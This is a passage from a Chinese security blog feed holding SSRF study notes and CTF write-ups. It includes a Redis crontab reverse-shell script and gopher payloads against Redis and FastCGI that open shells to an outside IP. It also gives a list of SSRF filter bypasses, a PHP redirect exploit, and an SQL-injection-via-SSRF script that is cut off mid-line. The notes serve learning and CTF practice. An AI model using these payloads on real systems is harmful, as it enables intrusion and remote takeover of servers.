operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>byname <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">else</span><span class="token punctuation">:</span>byname <span class="token operator">=</span> <span class="token boolean">False</span>userid <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token keyword">while</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>userid <span class="token operator">+=</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span>extra <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">if</span> byname<span class="token punctuation">:</span><span class="token keyword">while</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>extra <span class="token operator">+=</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">return</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> extra<span class="token keyword">def</span> <span class="token function">child</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">if</span> SOCKS<span class="token punctuation">:</span>req <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> extra <span class="token operator">=</span> decodesocks<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">if</span> extra <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>dest <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>dest <span class="token operator">=</span> extradestport<span class="token punctuation">,</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!H"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"x00x5a"</span><span class="token operator">+</span>port<span class="token operator">+</span>host<span class="token punctuation">)</span>data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print "sending:", data</span>encodeddata <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">)</span>url <span class="token operator">=</span> base<span class="token operator">+</span>CONNECT<span class="token operator">+</span>dest<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>destport<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/A"</span><span class="token operator">+</span>encodeddata<span class="token comment" spellcheck="true">#print "connecting to ", url</span>ret <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">)</span>retdata <span class="token operator">=</span> ret<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print "received:", retdata</span><span class="token keyword">if</span> len<span class="token punctuation">(</span>retdata<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>retdata<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span> esock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">'Usage: %s BASEURLnExample: %s "http://victim.com/xxe.php?uri="'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>base <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'listener ready on port'</span><span class="token punctuation">,</span> PORT<span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>client<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print 'connection from:', addr</span>thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token punctuation">(</span>client<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>攻击redis(6379端口)<br>更多的详细内容 请看 <a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></p><p>首先需要了解通过redis getshell的exp 写成的bash</p><pre><code>echo -e &quot;nn*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1nn&quot;|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit</code></pre><p>执行命令bash shell.sh 127.0.0.1:6389 可在redis里写入crontab的定时任务,本地通过nc -nvlp 2333 开启监听2333端口来反弹shell</p><p>redis常见的ssrf攻击大概有: </p><ol><li>绝对路径写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><p>详细内容还是看那篇文章.</p><p>将普通请求转成适配的gopher协议(看参考资料7)</p><p>攻击FastCGI</p><p> 首先根据faci_exp生成exp，随后改成支持gopher协议的URL</p><pre><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00</code></pre><p>本地监听2333端口  接收反弹shell</p><p>利用gopher协议存在的问题(参考资料3)</p><ol><li>PHP的curl默认不跟随302跳转</li><li>curl7.43上gopher协议存在%00截断的BUG，v7.49可用</li><li>file_get_contents()的SSRF，gopher协议不能使用URLencode</li><li>file_get_contents()的SSRF，gopher协议的302跳转有BUG会导致利用失败</li></ol><h1 id="0x04-bypass"><a href="#0x04-bypass" class="headerlink" title="0x04    bypass"></a>0x04    bypass</h1><p><strong>1)更改IP地址写法</strong>(在上一篇笔记中,有总结过IP地址的不同形式,但效果是一样的),如: 192.168.0.1</p><ul><li>8进制格式: 300.</li><li>16进制格式: 0xc0.0xa8.0.1</li><li>10进制整数格式: 3232235521</li><li>16进制整数格式: 0xC0A80001</li><li>特殊的省略模式: 列入<code>10.0.0.1</code>可写为<code>10.1</code></li></ul><p><strong>2)利用URL解析问题</strong>,在某些情况下,后端程序可能会对访问的URL进行解析,对解析出来的HOST地址进行过滤.如果URL参数解析不当,可能绕过过滤</p><ul><li><code>http://www.baidu.com@192.168.0.1/</code>与<code>http://192.168.0.1</code>请求的都是<code>192.168.0.1</code>的内容</li></ul><p>解释:  后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p><ul><li><p>可以指向任意 ip 的域名<code>xip.io</code>：<code>http://127.0.0.1.xip.io/</code>==&gt;<code>http://127.0.0.1/</code></p></li><li><p>短地址<code>http://dwz.cn/11SMa</code>==&gt;<code>http://127.0.0.1</code></p></li><li><p>利用句号<code>。</code>：<code>127。0。0。1</code>==&gt;<code>127.0.0.1</code></p></li><li><p>利用 Enclosed alphanumerics</p><pre><code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre></li></ul><p>这个就比较tql了…</p><p><strong>3)利用302跳转</strong></p><p>前提是服务器要允许30x跳转</p><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p><p>百度短网址服务,要钱的并且不支持ip形式<a href="https://dwz.cn/" target="_blank" rel="noopener">https://dwz.cn/</a></p><p>这个支持,并且感觉很不错 <a href="http://a.topurl.cn/#/" target="_blank" rel="noopener">http://a.topurl.cn/#/</a></p><p>(1)、在网络上存在一个很神奇的服务，<a href="http://xip.io" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如192.168.0.1.xip.io，就会自动重定向到192.168.0.1。</p><p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href="http://a.topurl.cn/#/所提供的短地址服务" target="_blank" rel="noopener">http://a.topurl.cn/#/所提供的短地址服务</a>.</p><p>这里提一下302跳转和307跳转的区别,307跳转回转发POST请求中的 数据等,但是302跳转不会.</p><p><strong>4)通过各种非HTTP协议</strong></p><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p><p>(1)、GOPHER协议：通过GOPHER我们在一个URL参数中构造Post或者Get请求，从而达到攻击内网应用的目的。例如我们可以使用GOPHER协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p><pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><p>(2)、File协议：File协议主要用于访问本地计算机中的文件，我们可以通过类似file:///文件路径这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过file:///d:/1.txt 来访问D盘中1.txt的内容</p><p><strong>5)DNS  Rebinding</strong></p><p>DNS重绑定</p><p><img src="https://image.3001.net/images/20170515/14948315084608.png!small" alt></p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，<strong>第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击</strong>。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个<strong>域名的解析指定到我们自己的DNS Server</strong>，在我们的<strong>可控的DNS Server上编写解析服务，设置TTL时间为0</strong>。这样就可以进行攻击了，完整的攻击流程为：</p><blockquote><p>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p><p>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p><p>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</p><p>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p></blockquote><p><strong>6)其他绕过</strong></p><p>利用[::]绕过localhost</p><p>一个好的黑客就是要不断的bypass…</p><p>利用@</p><p><a href="http://example.com@127.0.0.1" target="_blank" rel="noopener">http://example.com@127.0.0.1</a></p><p>利于中文句号</p><p>127。0。0。1</p><p><strong>7)绕过parse_url()</strong></p><p>参考 <a href="https://www.anquanke.com/post/id/101058?from=singlemessage" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101058?from=singlemessage</a></p><p><a href="https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass" target="_blank" rel="noopener">https://skysec.top/2018/03/15/Some%20trick%20in%20ssrf%20and%20unserialize()/#trick1-filter-var-bypass</a></p><p>原理: </p><blockquote><p><strong>parse_url与libcurl对curl的解析差异</strong></p></blockquote><pre><code>php 7.0libcurl 7.52</code></pre><p>匹配规则</p><pre><code>php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host</code></pre><p>比如如下url：</p><pre><code>http://u:p@a.com:80@b.com/</code></pre><p>php解析结果：</p><pre><code>schema: http host: b.comuser: upass: p@a.com:80</code></pre><p>而libcurl解析结果：</p><pre><code>schema: httphost: a.comuser: upass: pport: 80后面的@b.com/会被忽略掉</code></pre><p>那么此时，如果恶意代码检测是依据parse_url的结果，就会导致绕过问题<br>我们假设一个环境：<br>1.利用curl对用户给出ip进行访问并获取内容<br>2.为防止ssrf，我们利用parse_url进行解析，设置waf<br>那么就以刚才的url为例：<code>http://u:p@a.com:80@b.com/</code><br>如果我们的后端代码用parse_url()去解析我们传入的url，并只允许访问Host为b.com的ip<br>而此时如果我们传入的是刚才的url，那么我们可以绕过解析，并且curl访问到非法ip</p><h1 id="0x05-漏洞挖掘"><a href="#0x05-漏洞挖掘" class="headerlink" title="0x05    漏洞挖掘"></a>0x05    漏洞挖掘</h1><p><strong>1)Googlehacking</strong></p><ul><li>inurl:?apiurl=</li><li>inurl:?url=</li><li>inurl:?image=http://  ?image=https://</li><li>site:fanyi.*.com</li><li>inurl:?site=</li></ul><p><strong>2)二级域名搜集</strong></p><p><strong>3)上面写的漏洞出现场景</strong></p><h1 id="0x06-漏洞防御"><a href="#0x06-漏洞防御" class="headerlink" title="0x06    漏洞防御"></a>0x06    漏洞防御</h1><ul><li>限制协议为HTTP/HTTPS</li><li>禁止30X跳转</li><li>设置URL白名单或者限制内网IP(使用gethostbyname()判断是否为内网IP</li><li>服务端开启OpenSSL无法交互利用</li><li>服务端需要认证交互</li><li>把用于取外网资源的API部署在不属于自己的机房</li><li>过滤返回信息,验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>限制请求的端口为http常用的端口，比如 80、443、8080、8090</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li></ul><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07    总结"></a>0x07    总结</h1><p>跳转exp</p><ol><li><pre class=" language-PHP"><code class="language-PHP"><?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?></code></pre></li><li><p>常见的网络协议的知识还需要补充.比如什么端口对应什么服务</p></li></ol><p>比如,内网地址是ipv4地址协议中预留的分别是</p><ul><li>10.0.0.0–10.255.255.255</li><li>172.16.0.0–172.31.255.255 </li><li>192.168.0.0–192.168.255.255</li></ul><p>原文網址：<a href="https://kknews.cc/news/2kojba9.html" target="_blank" rel="noopener">https://kknews.cc/news/2kojba9.html</a></p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08    参考资料"></a>0x08    参考资料</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf-zh/</a></li><li><a href="https://3wapp.github.io/WebSecurity/常见协议.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE.html</a></li><li><a href="https://www.anquanke.com/post/id/145519" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145519</a></li><li><a href="https://www.sadk.org/日志/1795.html" target="_blank" rel="noopener">https://www.sadk.org/%E6%97%A5%E5%BF%97/1795.html</a></li><li><a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">https://xz.aliyun.com/t/5665</a></li><li><a href="https://github.com/iamultra/ssrfsocks" target="_blank" rel="noopener">https://github.com/iamultra/ssrfsocks</a></li><li><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></li><li>https://_thorns.gitbooks.io/sec/content/bilibilimou_fen_zhan_cong_xin_xi_xie_lu_dao_ssrf_z.html</li><li><a href="https://www.freebuf.com/articles/web/135342.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/135342.html</a></li><li><a href="http://blog.leanote.com/post/snowming/b42f5d7ab396" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/b42f5d7ab396</a>   有乌云的文章,好好学习吧</li><li><a href="http://blog.leanote.com/post/snowming/b654d901ff8a" target="_blank" rel="noopener">http://blog.leanote.com/post/snowming/b654d901ff8a</a></li><li><a href="https://paper.seebug.org/393/" target="_blank" rel="noopener">https://paper.seebug.org/393/</a></li><li><a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit" target="_blank" rel="noopener">SSRF圣经</a></li><li><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用Gopher协议拓展攻击面</a></li><li><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a>  总结了对应不同app的不同exp还有一些函数知识</li><li><a href="https://kknews.cc/news/2kojba9.html" target="_blank" rel="noopener">实战篇丨聊一聊SSRF漏洞的挖掘思路与技巧</a></li><li><a href="https://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">https://www.freebuf.com/column/157466.html</a></li></ol><p>其实网上关于SSRF的资料多的很,我也就根据了几篇感觉写的比较好的来总结的.更多的其实需要在懂了原理之后的实际操作.</p><p>后续补充把~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00    前言&quot;&gt;&lt;/a&gt;0x00    前言&lt;/h1&gt;&lt;p&gt;因为最近做题遇到了两道在考察SSRF漏洞的CTF题目,感觉只是知道个大概,知道怎么去判断
      
    
    </summary>
    
    
      <category term="TOP10基础漏洞" scheme="https://hack-for.fun/categories/TOP10%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    
    
      <category term="SSRF" scheme="https://hack-for.fun/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界上比较有意思的题目题解</title>
    <link href="https://hack-for.fun/posts/20200118/"/>
    <id>https://hack-for.fun/posts/20200118/</id>
    <published>2020-01-17T16:00:00.000Z</published>
    <updated>2020-02-12T02:29:25.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><p>知识点</p><ul><li>Perl语言漏洞</li><li>来源于Blackhat???</li></ul><p><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></p><p>下面是ppt里面的截图</p><p><img src="https://i.loli.net/2020/01/18/Un9P4mTwE1QDiqr.png" alt></p><p><img src="https://i.loli.net/2020/01/18/zED9YfSca2V4K7I.png" alt></p><p>打开题目有</p><ul><li>hello world , 告诉我们这道题是Perl语言的漏洞</li><li>cig(猜测可能存在Perl cgi相关的漏洞)</li><li>上传文件(可能存在与文件上传先关的漏洞….but)</li></ul><p>看了许多带佬的文章,都是直接猜测出来perl的源码</p><pre class=" language-perl"><code class="language-perl"><span class="token keyword">use</span> strict<span class="token punctuation">;</span> <span class="token keyword">use</span> warnings<span class="token punctuation">;</span> <span class="token keyword">use</span> CGI<span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$cgi</span><span class="token operator">=</span> CGI<span class="token operator">-></span>new<span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$cgi</span><span class="token operator">-></span>upload<span class="token punctuation">(</span> <span class="token string">'file'</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">my</span> <span class="token variable">$file</span><span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span>param<span class="token punctuation">(</span><span class="token string">'file'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">print</span> <span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> </code></pre><p>然后上传了一个 <code>ARGV</code> 实现了 <code>任意文件读取</code></p><p>原理是这样的</p><p><code>param()</code>函数会返回 <strong>一个列表的文件</strong> 但是 <strong>只有第一个文件会被放入到下面的file变量中</strong>。如果我们传入一个<code>ARGV</code>的文件，那么Perl会将传入的参数作为文件名读出来。</p><p>在正常的上传文件<strong>前面加上一个文件上传项ARGV</strong>，然后在URL中传入文件路径参数，可以实现读取任意文件读取</p><p>可以直接猜测存在flag这个文件,但是正常的思路是先列出当前又哪些文件,然后再来读取</p><p><img src="https://i.loli.net/2020/01/18/g45ihuVcEkdFzsP.png" alt></p><p>这里就是使用bash执行系统命令</p><p><img src="https://i.loli.net/2020/01/18/N29AEpqc61VCL7y.png" alt></p><p>通过管道的方式，执行任意命令，然后将其输出结果用管道传输到读入流中，这样就可以保证获取到flag文件的位置了。这里用到了${IFS}来作命令分割，原理是会将结果变成<code>bash -c &quot;ls/&quot;</code>的等价形式.</p><p><strong>总结：如果是perl写的网页并且遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。</strong></p><p>具体是什么原理等我大概过了Perl看能不能解释吧,现在就先把怎么解决这类问题的做法学会.(太懒的借口</p><h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><ul><li>下载下的php文件打开后看到内容为pdf格式,修改为pdf格式,讲SSRF的文章</li><li>目录扫描,发现secert这个目录,点击进去存在两个页面</li></ul><p><img src="https://i.loli.net/2020/01/18/VNxXdg7epnF4Huo.png" alt></p><p><img src="https://i.loli.net/2020/01/18/zkeal2tHXLWp5xs.png" alt></p><p>访问<code>secret_debug.php</code> You (ip) do not have access to this page…</p><p>由此处说明极有可能存在SSRF然后来访问这个页面得到flag</p><p>访问<code>secret.php</code>是一个注册页面,我们输入的数据是进入了数据库中的,因此可能存在SQLi.果然,当输入 <code>1&#39; or 1=1</code> 时就会报错</p><p><img src="https://i.loli.net/2020/01/18/pSnkCbtD3BUReVh.png" alt></p><p><img src="https://i.loli.net/2020/01/18/X1K3uMFQpknxWD5.png" alt></p><p>因此利用点肯定是</p><ul><li>SSRF</li><li>SQLi</li></ul><p>EXP</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> urlliburl <span class="token operator">=</span> <span class="token string">'http://111.198.29.45:33406/download.php'</span><span class="token comment" spellcheck="true">#subquery = "database()" </span><span class="token comment" spellcheck="true">#subquery = "select table_name from information_schema.tables where table_schema='ssrfw' LIMIT 1" </span><span class="token comment" spellcheck="true">#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1" </span><span class="token comment" spellcheck="true">#subquery = "select column_name from information_schema.columns where table_name='cetcYssrf' LIMIT 1 OFFSET 1" </span>subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>dl <span class="token operator">=</span> <span class="token string">'%x'</span><span class="token operator">%</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/secret/secret_debug.php?'</span> <span class="token operator">+</span>        urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>             <span class="token string">"s"</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span>             <span class="token string">"txtfirst_name"</span><span class="token punctuation">:</span><span class="token string">"A','b',("</span><span class="token operator">+</span>subquery<span class="token operator">+</span><span class="token string">"),'c'/*"</span><span class="token punctuation">,</span>             <span class="token string">"txtmiddle_name"</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span>             <span class="token string">"txtname_suffix"</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span>             <span class="token string">"txtLast_name"</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span>             <span class="token string">"txtdob"</span><span class="token punctuation">:</span><span class="token string">"*/,'E"</span><span class="token punctuation">,</span>             <span class="token string">"txtdl_nmbr"</span><span class="token punctuation">:</span>dl<span class="token punctuation">,</span>             <span class="token string">"txtRetypeDL"</span><span class="token punctuation">:</span>dl            <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span>        <span class="token string">"&amp;"</span><span class="token punctuation">)</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token 